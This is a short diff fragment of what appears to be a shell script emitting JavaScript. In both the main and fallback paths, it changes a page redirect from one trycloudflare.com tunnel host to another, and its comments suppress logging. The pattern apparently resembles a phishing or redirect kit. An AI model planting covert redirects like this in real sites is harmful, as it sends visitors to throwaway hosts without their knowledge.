@@ -101,11 +101,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://comm-thy-grocery-first.trycloudflare.com/index2.html";
+                window.location.href = "https://engine-cope-engineer-functionality.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://comm-thy-grocery-first.trycloudflare.com/index2.html";
+                window.location = "https://engine-cope-engineer-functionality.trycloudflare.com/index2.html";
             }
         }
         
